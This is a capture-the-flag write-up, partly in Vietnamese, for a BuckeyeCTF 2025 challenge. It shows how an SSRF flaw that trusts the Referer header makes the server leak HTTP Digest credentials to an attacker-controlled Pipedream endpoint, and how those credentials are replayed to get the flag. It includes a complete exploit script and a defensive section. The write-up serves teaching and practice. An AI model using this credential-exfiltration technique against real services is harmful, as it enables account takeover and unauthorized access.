# AUTHMAN

## Challenge Description

```
Một ứng dụng Flask với HTTP Digest Authentication.
Endpoint /auth được bảo vệ bởi digest auth và chứa flag.
Có endpoint /api/check có lỗ hổng SSRF - gửi credentials đến URL trong Referer header.
```

**Files provided:**

- Source code Flask application
- routes.py, config.py, main.py
- Dockerfile

**Challenge URL:** `https://authman.challs.pwnoh.io`

**Note:** Remote can only connect to ports 80/443

---

## Difficulty Assessment

### Overall Difficulty: Medium-Hard

**Breakdown:**

- **Technical Complexity:** ⭐⭐⭐⭐☆
- **Research Required:** ⭐⭐⭐⭐☆
- **Time Consumption:** ⭐⭐⭐⭐☆
- **Guessing Factor:** ⭐⭐☆☆☆

**Why this difficulty?**
Bài này yêu cầu hiểu về HTTP Digest Authentication mechanism, SSRF exploitation, và cách setup external server để capture credentials. Cần nhiều steps và external services để hoàn thành.

---

## Topics & Techniques

### Primary Topic

- **Server-Side Request Forgery (SSRF)** - Khai thác endpoint để leak HTTP Digest credentials

### Sub-topics & Skills Required

- [x] **HTTP Digest Authentication** - Hiểu challenge-response mechanism của Digest Auth
- [x] **SSRF Exploitation** - Khai thác Referer header để redirect requests
- [x] **External Request Capture** - Sử dụng RequestBin/Pipedream để capture HTTP requests
- [x] **HTTP Headers Manipulation** - Manipulate WWW-Authenticate và Authorization headers
- [x] **Flask Security** - Phân tích lỗ hổng trong Flask applications

---

## Tools Used

### Essential Tools

```bash
# Python HTTP client
from http.client import HTTPSConnection

# External request capture services
# - RequestBin.net
# - Pipedream.com
```

### Tools List

| Tool       | Purpose                           | Installation   |
| ---------- | --------------------------------- | -------------- |
| Python     | Scripting HTTP requests           | Built-in       |
| RequestBin | Initial request capture testing   | Online service |
| Pipedream  | Advanced request/response control | Online service |
| Burp Suite | HTTP traffic analysis             | Download       |

---

## Useful Resources

### Documentation & References

- [HTTP Digest Authentication - RFC 7616](https://datatracker.ietf.org/doc/html/rfc7616) - Official specification
- [Flask-HTTPAuth](https://flask-httpauth.readthedocs.io/) - Flask authentication extensions
- [Python requests library](https://requests.readthedocs.io/en/latest/user/authentication/#digest-authentication) - Digest auth implementation

### Learning Materials

- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery) - SSRF attack overview
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf) - SSRF exploitation techniques
- [HTTP Authentication Schemes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication) - HTTP auth mechanisms

---

## Solution Walkthrough

### TL;DR (Quick Summary)

Khai thác SSRF trong `/api/check` endpoint bằng cách control Referer header. Setup external server (Pipedream) để respond với WWW-Authenticate challenge, capture Digest Auth credentials từ AUTHMAN, sau đó replay credentials để access `/auth` và lấy flag.

---

### Step 1: Source Code Analysis

**Objective:** Phân tích code để tìm lỗ hổng

**Phân tích routes.py:**

```python
@app.route('/auth',methods=['GET'])
@auth.login_required
def auth():
    return render_template("auth.html",flag=app.config['FLAG'])
    # ⚠️ Protected by digest auth - cần credentials

@app.route('/api/check',methods=['GET'])
def check():
    (user, pw), *_ = app.config['AUTH_USERS'].items()  # ⚠️ Get first user credentials
    res = requests.get(r.referrer + '/auth',  # ⚠️ SSRF: Uses Referer header!
        auth = HTTPDigestAuth(user,pw),  # ⚠️ Sends credentials to external URL!
        timeout=3
    )
    return jsonify({'status':res.status_code})
```

**Phân tích config.py:**

```python
class FlaskConfig:
    SECRET_KEY = token_hex(32)
    AUTH_USERS = {
        "keno": token_urlsafe(16),  # ⚠️ Random password
        "tenk": token_urlsafe(16)
    }
    FLAG = os.environ.get('FLAG','bctf{fake_flag_for_testing}')
```

**Observations:**

- `/auth` endpoint chứa flag nhưng được bảo vệ bởi HTTP Digest Authentication
- Username là `"keno"`, password là random 16-byte token
- `/api/check` có lỗ hổng SSRF:
  - Sử dụng `r.referrer` (Referer header) để construct URL
  - Gửi HTTP Digest credentials đến URL đó!
  - Nếu control được Referer → capture được credentials

**Key findings:**

- SSRF vulnerability cho phép redirect credentials đến external server
- Cần setup server để:
  1. Respond với `401 Unauthorized` + `WWW-Authenticate` header
  2. Capture Authorization header với Digest response
  3. Replay credentials về AUTHMAN để lấy flag

---

### Step 2: Understanding HTTP Digest Authentication

**Objective:** Hiểu cơ chế Digest Auth để exploit

**HTTP Digest Auth Flow:**

```
1. Client → Server: GET /auth
2. Server → Client: 401 Unauthorized
                     WWW-Authenticate: Digest realm="...", nonce="...", ...
3. Client → Server: GET /auth
                    Authorization: Digest username="...", response="...", ...
4. Server → Client: 200 OK (if valid)
```

**WWW-Authenticate header contains:**

- `realm`: Authentication realm
- `nonce`: Server-generated random value (prevents replay)
- `opaque`: Server-specific data
- `algorithm`: Hash algorithm (usually MD5)
- `qop`: Quality of protection

**Authorization header contains:**

- `username`: User's username
- `realm`: Same as challenge
- `nonce`: Same as challenge
- `uri`: Request URI
- `response`: MD5 hash of (username, realm, password, nonce, uri)
- `nc`: Nonce count
- `cnonce`: Client nonce

**Exploit idea:**

- Make AUTHMAN send credentials to our server
- Our server must respond with valid `WWW-Authenticate` challenge
- Capture the Authorization header from AUTHMAN's second request
- Replay that Authorization to AUTHMAN's `/auth` endpoint

---

### Step 3: Initial Testing with RequestBin

**Objective:** Verify SSRF works và test request capture

**Setup RequestBin:**

1. Visit https://requestbin.net
2. Create request bin: `f1a2743e06cbeba88a6fg1rdjfhyyyyyn.oast.me`

**Test SSRF:**

```python
from http.client import HTTPSConnection

client = HTTPSConnection("authman.challs.pwnoh.io")
client.request("GET", "/api/check", headers={
    "Referer": "http://f1a2743e06cbeba88a6fg1rdjfhyyyyyn.oast.me/"
})
response = client.getresponse()
print(response.read())  # {'status': ...}
response.close()
```

**Result:**

- ✅ Request received at RequestBin
- ❌ No credentials in request → RequestBin không respond với `WWW-Authenticate`
- **Problem:** RequestBin chỉ capture requests, không control responses

**Insight:** Cần service cho phép custom response headers (401 + WWW-Authenticate)

---

### Step 4: Getting WWW-Authenticate Header from AUTHMAN

**Objective:** Lấy WWW-Authenticate header để replicate cho external server

**Request to /auth without credentials:**

```python
from http.client import HTTPSConnection

client = HTTPSConnection("authman.challs.pwnoh.io")
client.request("GET", "/auth")
response = client.getresponse()
session = response.headers["Set-Cookie"].split(";")[0]
www_auth = response.headers["WWW-Authenticate"]
print(www_auth)
response.close()
```

**Output:**

```
Digest realm="Authentication Required",
       nonce="ff958602396b76cbd4f7f978809fdf5a",
       opaque="1503fa914d0aefe95df8d6af0bcb2c0c",
       algorithm="MD5",
       qop="auth"
```

**Key findings:**

- Session cookie được set (cần giữ session consistency)
- WWW-Authenticate challenge có format cụ thể
- Cần replicate exact header này cho external server

---

### Step 5: Setting Up Pipedream for Response Control

**Objective:** Setup Pipedream để respond với custom headers

**Pipedream Setup:**

1. Visit https://pipedream.com
2. Create new HTTP/Webhook source
3. URL received: `https://eoh0ijdaytf6cg3.m.pipedream.net`
4. Configure response:
   - Status: `401 Unauthorized`
   - Header: `WWW-Authenticate: <value_from_step_4>`

**Pipedream Configuration:**

```javascript
// In Pipedream workflow
export default defineComponent({
  async run({ steps, $ }) {
    await $.respond({
      status: 401,
      headers: {
        "WWW-Authenticate":
          'Digest realm="Authentication Required", nonce="ff958602396b76cbd4f7f978809fdf5a", opaque="1503fa914d0aefe95df8d6af0bcb2c0c", algorithm="MD5", qop="auth"',
      },
    });
  },
});
```

---

### Step 6: Capturing Digest Credentials

**Objective:** Trigger SSRF để AUTHMAN gửi credentials đến Pipedream

**Exploit request:**

```python
from http.client import HTTPSConnection

client = HTTPSConnection("authman.challs.pwnoh.io")
client.request("GET", "/api/check", headers={
    "Referer": "https://eoh0ijdaytf6cg3.m.pipedream.net"
})
response = client.getresponse()
print(response.read())  # {'status': 401} or {'status': 200}
response.close()
```

**What happens:**

1. AUTHMAN calls `/api/check`
2. Server makes request: `GET https://eoh0ijdaytf6cg3.m.pipedream.net/auth`
3. Pipedream responds: `401 + WWW-Authenticate`
4. AUTHMAN's `requests` library automatically retries with Digest Auth
5. Second request includes `Authorization: Digest username="keno", response="..."...`
6. Pipedream captures this Authorization header!

**Captured Authorization header from Pipedream:**

```
Digest username="keno",
       realm="Authentication Required",
       nonce="ff958602396b76cbd4f7f978809fdf5a",
       uri="/auth",
       response="3e43af836a4597a4a91e3f5959b175d4",
       opaque="1503fa914d0aefe95df8d6af0bcb2c0c",
       algorithm="MD5",
       qop="auth",
       nc=00000001,
       cnonce="b9175795215ce39d"
```

**Critical values:**

- `username="keno"` ✅
- `response="3e43af836a4597a4a91e3f5959b175d4"` ✅ - Valid digest hash
- `nc=00000001` - Nonce count
- `cnonce="b9175795215ce39d"` - Client nonce

---

### Step 7: Replaying Credentials to Get Flag

**Objective:** Sử dụng captured credentials để access `/auth`

**Replay attack:**

```python
from http.client import HTTPSConnection

client = HTTPSConnection("authman.challs.pwnoh.io")
client.request("GET", "/auth", headers={
    "Authorization": 'Digest username="keno", realm="Authentication Required", nonce="ff958602396b76cbd4f7f978809fdf5a", uri="/auth", response="3e43af836a4597a4a91e3f5959b175d4", opaque="1503fa914d0aefe95df8d6af0bcb2c0c", algorithm="MD5", qop="auth", nc=00000001, cnonce="b9175795215ce39d"',
    "Cookie": session  # Use session from Step 4
})
response = client.getresponse()
body = response.read().decode()

# Extract flag from HTML
body = body[body.index("bctf{"):]
body = body[:body.index("}")+1]
print(body)

response.close()
```

**Response:**

```html
<!-- auth.html -->
<h1>Welcome, keno!</h1>
<p>Flag: bctf{passwords_wont_save_you_now}</p>
```

**Flag obtained:**

```
bctf{passwords_wont_save_you_now}
```

---

## Complete Exploit Code

<details>
<summary>Click to expand full exploit code</summary>

```python
#!/usr/bin/env python3
"""
Exploit for AUTHMAN Challenge - BuckeyeCTF 2025
Author: Based on AUTHMAN.ipynb analysis
"""

from http.client import HTTPSConnection
import time

TARGET = "authman.challs.pwnoh.io"
PIPEDREAM_URL = "https://eoh0ijdaytf6cg3.m.pipedream.net"  # Your Pipedream URL

def exploit():
    print("[*] AUTHMAN CTF - SSRF + HTTP Digest Auth Credential Leak")
    print("[*] Target:", TARGET)

    # Step 1: Get WWW-Authenticate challenge from AUTHMAN
    print("\n[*] Step 1: Getting WWW-Authenticate header from /auth...")
    client = HTTPSConnection(TARGET)
    client.request("GET", "/auth")
    response = client.getresponse()
    session = response.headers["Set-Cookie"].split(";")[0]
    www_auth = response.headers["WWW-Authenticate"]
    response.close()

    print(f"[+] Session: {session}")
    print(f"[+] WWW-Authenticate: {www_auth}")

    # Step 2: Configure Pipedream to respond with this header
    print("\n[*] Step 2: Configure Pipedream workflow:")
    print(f"    1. Go to {PIPEDREAM_URL}")
    print(f"    2. Set response status: 401")
    print(f"    3. Set header WWW-Authenticate: {www_auth}")
    input("    Press Enter when Pipedream is configured...")

    # Step 3: Trigger SSRF to leak credentials
    print("\n[*] Step 3: Triggering SSRF to leak credentials to Pipedream...")
    client = HTTPSConnection(TARGET)
    client.request("GET", "/api/check", headers={
        "Referer": PIPEDREAM_URL
    })
    response = client.getresponse()
    status = response.read().decode()
    response.close()

    print(f"[+] SSRF triggered, response: {status}")

    # Step 4: Get captured Authorization header from Pipedream
    print("\n[*] Step 4: Check Pipedream logs for Authorization header")
    print("    Look for: Authorization: Digest username=\"keno\", ...")
    auth_header = input("    Paste Authorization header value: ")

    # Step 5: Replay credentials
    print("\n[*] Step 5: Replaying credentials to /auth...")
    client = HTTPSConnection(TARGET)
    client.request("GET", "/auth", headers={
        "Authorization": auth_header,
        "Cookie": session
    })
    response = client.getresponse()
    body = response.read().decode()
    response.close()

    # Extract flag
    if "bctf{" in body:
        flag_start = body.index("bctf{")
        flag_end = body.index("}", flag_start) + 1
        flag = body[flag_start:flag_end]
        print(f"\n[!] FLAG FOUND: {flag}\n")
    else:
        print("[-] Flag not found in response")
        print("[*] Response preview:")
        print(body[:500])

if __name__ == "__main__":
    exploit()
```

</details>

---

## Alternative Solutions

### Method 2: Using ngrok + Local Server

Setup local Flask server để control responses:

```python
from flask import Flask, Response

app = Flask(__name__)

@app.route('/auth')
def auth():
    return Response(
        status=401,
        headers={
            'WWW-Authenticate': 'Digest realm="Authentication Required", nonce="...", ...'
        }
    )

# Expose with ngrok
# ngrok http 5000
```

### Method 3: Using Burp Collaborator

Burp Suite Professional có Collaborator server để capture requests.

---

## Key Takeaways & Lessons Learned

### What I Learned

1. **HTTP Digest Authentication Flow:** Hiểu sâu về challenge-response mechanism, nonce, và digest calculation. Digest auth prevents password transmission nhưng credentials vẫn có thể leaked qua SSRF.

2. **SSRF with Authenticated Requests:** SSRF không chỉ leak internal endpoints mà còn có thể leak authentication credentials khi application tự động authenticate với external URLs.

3. **Importance of External Services:** CTF thường require external services (RequestBin, Pipedream, ngrok) để capture out-of-band data. Biết sử dụng các tools này rất quan trọng.

4. **Session Consistency:** HTTP Digest Auth trong Flask có thể require session consistency. Cần maintain session cookie từ challenge request đến authentication request.

5. **Multi-Step Attacks:** Attack phức tạp cần nhiều steps:
   - Reconnaissance (get challenge format)
   - Setup infrastructure (external server)
   - Trigger exploit (SSRF)
   - Capture data (credentials)
   - Replay attack (use credentials)

### Mistakes Made

- ❌ Dùng RequestBin → không control được response → ✅ Chuyển sang Pipedream
- ❌ Quên giữ session cookie → authentication failed → ✅ Maintain session throughout

### Tips & Tricks

- 💡 Khi thấy SSRF + authenticated requests → nghĩ đến credential leakage
- 💡 HTTP Digest Auth có thể replay trong timeframe của nonce validity
- 💡 Pipedream > RequestBin khi cần control response headers/body
- 💡 Luôn check session requirements trong authentication flows
- 💡 Copy exact headers từ legitimate requests để ensure compatibility

### Real-world Application

**SSRF + Credential Leakage trong production:**

- **Cloud Metadata Leakage:** AWS EC2 metadata endpoint (`169.254.169.254`)
- **Internal API Credentials:** Services authenticating to internal APIs via SSRF
- **OAuth Token Theft:** Redirect OAuth callbacks to attacker-controlled servers
- **Webhook Exploitation:** Webhooks sending authenticated requests to external URLs

**Impact:**

- Account takeover
- Access to internal services
- Privilege escalation
- Data exfiltration

---

## Prevention & Mitigation

### How to prevent SSRF with credential leakage?

1. **Never use user input in URLs for authenticated requests:**

```python
# Bad code (vulnerable)
@app.route('/api/check')
def check():
    (user, pw), *_ = app.config['AUTH_USERS'].items()
    res = requests.get(r.referrer + '/auth',  # ❌ User-controlled URL
        auth = HTTPDigestAuth(user,pw)
    )
    return jsonify({'status':res.status_code})

# Good code (secure)
@app.route('/api/check')
def check():
    # Don't use credentials with user-controlled URLs at all!
    # If must check endpoint, whitelist allowed URLs
    allowed_hosts = ['authman.challs.pwnoh.io']

    referrer = r.referrer
    if not referrer or urlparse(referrer).hostname not in allowed_hosts:
        return jsonify({'error': 'Invalid referrer'}), 400

    # Still risky to send credentials...
```

2. **Whitelist allowed destinations:**

```python
from urllib.parse import urlparse

def is_allowed_url(url):
    parsed = urlparse(url)
    allowed_hosts = ['internal-service.local', 'api.example.com']
    allowed_schemes = ['http', 'https']

    if parsed.scheme not in allowed_schemes:
        return False
    if parsed.hostname not in allowed_hosts:
        return False

    return True

@app.route('/api/check')
def check():
    target_url = r.referrer + '/auth'

    if not is_allowed_url(target_url):
        return jsonify({'error': 'Forbidden URL'}), 403

    # Proceed with request...
```

3. **Don't trust Referer header:**

```python
# Referer can be spoofed!
# Never use it for security decisions or URL construction
```

4. **Separate credentials for external vs internal:**

```python
# Don't use same credentials for external requests
# Use API keys with limited scope instead
```

5. **Network-level protections:**

```python
# - Deny outbound connections to external IPs from application servers
# - Use egress filtering
# - Monitor outbound connections
# - Implement request signing for service-to-service auth
```

### Secure Authentication Practices

```python
# 1. Use tokens instead of credentials for automated requests
# 2. Implement proper CORS policies
# 3. Don't send credentials to user-controlled URLs
# 4. Validate and sanitize all URL inputs
# 5. Use allowlists, not denylists
```

### Defense in Depth

```bash
# 1. Input validation (URL whitelisting)
# 2. Network segmentation (restrict outbound)
# 3. Monitoring (detect unusual outbound requests)
# 4. Rate limiting (prevent mass credential theft)
# 5. Use short-lived tokens instead of credentials
```

---

## References & Credits

### Official Resources

- Challenge author: BuckeyeCTF 2025 Team
- Challenge URL: https://authman.challs.pwnoh.io

### Community Writeups

- Original analysis: AUTHMAN.ipynb
- This writeup by Copilot - 2025-11-14

### Tools & Libraries Used

- [Flask](https://flask.palletsprojects.com/) - Web framework
- [Flask-HTTPAuth](https://flask-httpauth.readthedocs.io/) - Authentication extension
- [Python requests](https://requests.readthedocs.io/) - HTTP library with Digest Auth
- [Pipedream](https://pipedream.com/) - Request/response manipulation
- [RequestBin](https://requestbin.net/) - Request capture

### Additional Reading

- [RFC 7616 - HTTP Digest Access Authentication](https://datatracker.ietf.org/doc/html/rfc7616)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
